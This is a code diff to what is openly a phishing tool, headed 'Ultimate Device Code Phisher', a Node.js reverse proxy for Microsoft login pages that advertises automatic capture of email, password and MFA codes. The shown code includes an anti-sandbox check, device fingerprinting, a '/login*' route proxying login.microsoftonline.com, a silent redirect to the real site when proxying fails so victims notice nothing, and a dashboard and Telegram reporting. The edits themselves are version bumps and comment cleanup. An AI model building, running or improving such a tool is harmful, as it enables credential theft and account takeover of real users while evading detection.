@@ -1,9 +1,8 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3.1 – Phantom Proxy Final
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3.2 – Phantom Proxy Final
 // ============================================================
 // Full reverse-proxy for Microsoft login pages with automatic
-// email, password, and MFA code capture. Injects a stealth
-// script into every HTML page served. No static login.html interference.
+// email, password, and MFA code capture. No canvas dependency.
 // ============================================================
 
 const http = require('http');
@@ -434,11 +433,8 @@ function antiSandbox(req, res, next) {
 // ── Express App ──
 const app = express();
 app.use(express.json());
-// Serves static files but we explicitly exclude login.html to avoid interception
-const staticOpts = { index: false }; // prevent serving index.html automatically – we'll handle separately
+const staticOpts = { index: false }; // prevent serving index.html automatically
 app.use(express.static('public', staticOpts));
-// Serve dashboard index.html separately
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html'))); // optional fallback
 
 app.use((req, res, next) => {
     res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
@@ -629,7 +625,6 @@ app.post('/device/fingerprint', (req, res) => {
 });
 
 // ── SECOND-STAGE PHISHING: FULL REVERSE PROXY WITH AUTO MFA CAPTURE ──
-// This catches any request starting with /login (including subpaths)
 app.all('/login*', async (req, res) => {
     const targetBase = 'https://login.microsoftonline.com';
     let targetPath = req.url.replace(/^\/login/, '');
@@ -757,7 +752,6 @@ app.all('/login*', async (req, res) => {
 
     } catch (error) {
         console.error('Proxy error:', error.message);
-        // 🛡️ If proxy fails, silently redirect to real Microsoft instead of showing an error page
         res.redirect('https://login.microsoftonline.com');
     }
 });
@@ -992,7 +986,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.3.1 – Phantom Proxy Final running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.3.2 – Phantom Proxy Final running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
